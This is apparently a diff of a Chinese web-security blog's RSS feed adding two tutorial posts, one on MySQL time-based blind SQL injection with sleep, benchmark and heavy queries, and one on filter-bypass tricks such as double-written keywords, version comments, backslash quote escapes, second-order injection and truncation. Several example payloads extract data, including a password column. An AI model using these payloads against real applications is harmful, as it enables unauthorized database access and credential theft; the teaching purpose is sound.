@@ -5,8 +5,203 @@
         <link>https://hq185187.github.io</link>
         <description>不定时更新web安全相关知识</description>
         <language>zh-CN</language>
-        <pubDate>Fri, 28 Apr 2023 15:34:52 +0800</pubDate>
-        <lastBuildDate>Fri, 28 Apr 2023 15:34:52 +0800</lastBuildDate>
+        <pubDate>Sun, 07 May 2023 15:33:27 +0800</pubDate>
+        <lastBuildDate>Sun, 07 May 2023 15:33:27 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</guid>
+            <title>时间盲注</title>
+            <link>https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</link>
+            <pubDate>Sun, 07 May 2023 15:33:27 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;例子的表:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;id&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;name&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;url&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;alexa&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;country&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Google&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ29vZ2xlLmNtLw==&#34;&gt;https://www.google.cm/&lt;/span&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;USA&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;淘宝&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGFvYmFvLmNvbS8=&#34;&gt;https://www.taobao.com/&lt;/span&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;13&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;CN&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;3&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;菜鸟教程&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ydW5vb2IuY29tLw==&#34;&gt;http://www.runoob.com/&lt;/span&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;10&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;CN&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;4&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;微博&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dlaWJvLmNvbS8=&#34;&gt;http://weibo.com/&lt;/span&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;20&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;CN&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;5&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Facebook&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLw==&#34;&gt;https://www.facebook.com/&lt;/span&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;3&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;USA&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;7&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;stackoverflow&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tLw==&#34;&gt;http://stackoverflow.com/&lt;/span&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;0&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;IND&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;基本延时的盲注sleep&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基本延时的盲注sleep&#34;&gt;#&lt;/a&gt; 基本延时的盲注:sleep&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from 表名 where id=1 and sleep(2);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;配合 if 语句&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if(expr1,expr2,expr3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;expr1是真,返回expr2,否则expr3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from websites where name=&amp;#x27;1&amp;#x27; or if(name=&amp;#x27;Facebook&amp;#x27;,sleep(2),null);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;判断是否有网站名字为Facebook&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;配合截取函数&lt;br&gt;
+ substr (string,start,length)&lt;br&gt;
+mid(string,start,length)&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from websites where name=&amp;#x27;2&amp;#x27; or if(substr((select name from websites where id=1),0,1)=&amp;#x27;G&amp;#x27;,sleep(2),0);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;1benchmark&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1benchmark&#34;&gt;#&lt;/a&gt; 1.benchmark()&lt;/h3&gt;
+&lt;p&gt;benchmark 是 MySQL 的一个内置函数，作用是测试一些函数的执行速度.benchmark 中有两个参数，第一个是执行的次数，第二个是要执行的函数或者表达式&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mysql&amp;gt; select benchmark(10000,md5(&amp;#x27;a&amp;#x27;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| benchmark(10000,md5(&amp;#x27;a&amp;#x27;)) |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                         0 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 row in set (0.01 sec)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysql&amp;gt; select benchmark(100000000,md5(&amp;#x27;a&amp;#x27;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| benchmark(100000000,md5(&amp;#x27;a&amp;#x27;)) |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                             0 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 row in set (14.29 sec)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;可以看到执行次数不同，时间也不同，我们接下来用它来达到 sleep 的延时目的&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select 1 and if((substr(user(),1,1)=&amp;#x27;r&amp;#x27;),BENCHMARK(10000000,md5(&amp;#x27;a&amp;#x27;)),1);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;2heavy-query&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2heavy-query&#34;&gt;#&lt;/a&gt; 2.heavy query&lt;/h3&gt;
+&lt;p&gt;通过大量的查询导致查询时间变长来达到延时目的&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select count(*) from information_schema.tables A,information_schema.tables B;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select 1 and if((substr(user(),1,1)=&amp;#x27;r&amp;#x27;),(select count(*) from information_schema.tables A,information_schema.tables B;),1);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/</guid>
+            <title>SQL注入绕过</title>
+            <link>https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/</link>
+            <pubDate>Sat, 29 Apr 2023 01:31:47 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;一字符替换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一字符替换&#34;&gt;#&lt;/a&gt; 一。字符替换&lt;/h1&gt;
+&lt;h3 id=&#34;1过滤空格&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1过滤空格&#34;&gt;#&lt;/a&gt; 1. 过滤空格&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;%0a,%0b,%0c,%0d,%09,%a0(只在特定字符集才能利用),/**/,括号等&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;2select替换成空&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2select替换成空&#34;&gt;#&lt;/a&gt; 2.select 替换成空&lt;/h3&gt;
+&lt;p&gt;双写 selectselect&lt;/p&gt;
+&lt;h3 id=&#34;3大小写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3大小写绕过&#34;&gt;#&lt;/a&gt; 3. 大小写绕过&lt;/h3&gt;
+&lt;p&gt;MySQL 中是不区分大小写的，若是过滤了 SELECT, 就用 select 绕过，其他同理&lt;/p&gt;
+&lt;h3 id=&#34;4正则匹配&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4正则匹配&#34;&gt;#&lt;/a&gt; 4. 正则匹配&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;正则匹配\bselect\b可以用形如/*!50000*/方法绕过&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/*!50000*/是一种特殊的注释,里面的SQL会被执行,50000是一个版本号,假设MySQL版本大于这个版本号就执行里面的SQL语句&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;5替换了单引号或双引号忘记了反斜杠&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5替换了单引号或双引号忘记了反斜杠&#34;&gt;#&lt;/a&gt; 5. 替换了单引号或双引号，忘记了反斜杠&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM wp_news WHERE id=&amp;#x27;可控点1&amp;#x27; AND title=&amp;#x27;可控点2&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;绕过&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM wp_news WHERE id=&amp;#x27;a\&amp;#x27; AND title=&amp;#x27;OR sleep(1)#&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;第一个可控点的反斜杠转义可控点 1 预置的单引号，导致可控点 2 逃逸出单引号&lt;br&gt;
+ eg&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; websites &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;a\&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; url&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;union select 1,2,(select concat(id,0x7e,url)from websites limit 1)#&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;二逃逸引号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二逃逸引号&#34;&gt;#&lt;/a&gt; 二。逃逸引号&lt;/h3&gt;
+&lt;p&gt;注入的重点是逃逸引号，但开发者往往会做一次 addslashes (转义单双引号，反斜杠), 怎么绕过&lt;/p&gt;
+&lt;h3 id=&#34;1编码解码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1编码解码&#34;&gt;#&lt;/a&gt; 1. 编码解码&lt;/h3&gt;
+&lt;p&gt;宽字节注入，稍后说&lt;/p&gt;
+&lt;h3 id=&#34;2意料之外的注入点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2意料之外的注入点&#34;&gt;#&lt;/a&gt; 2. 意料之外的注入点&lt;/h3&gt;
+&lt;p&gt;开发者在转义用户输入时遗漏了一些可注入点.PHP: 文件的上传名，http header,$SERVER [‘PHP_SELF’] 这些变量，稍后举例&lt;/p&gt;
+&lt;h3 id=&#34;3二次注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3二次注入&#34;&gt;#&lt;/a&gt; 3. 二次注入&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;id&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;username&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;password&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;admin&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;password&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;假设一个表如上图，用户输入:&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;insert&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;into&lt;/span&gt; wp_user &lt;span class=&#34;keyword&#34;&gt;values&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin\&amp;#x27;&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt;\&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;some pass&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;此时库的内容是:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;id&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;username&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;password&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;admin’or’1&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;somepass&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;引号被转义，正常入库，但是当这个用户名被再次使用时&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$conn&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT password from wp_user where username=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$name&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;此时 SQL 语句为&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; wp_user &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;此时产生注入&lt;/p&gt;
+&lt;h3 id=&#34;4字符串截断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4字符串截断&#34;&gt;#&lt;/a&gt; 4. 字符串截断&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;title&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;INSERT INTO wp_news VALUES(2,&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$title&lt;/span&gt;&amp;#x27;,&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$content&lt;/span&gt;&amp;#x27;)&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;假如输入 aaaaaaaaa’,&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;自动转义为aaaaaaaaa\&amp;#x27;,由于字符串长度限制被截取为aaaaaaaaa\,转义了预置的单引号,就能注入了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?title=aaaaaaaaa&amp;#x27;&amp;amp;content=,1,1),(3,4,(select pwd from wp_user limit 1),1)#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
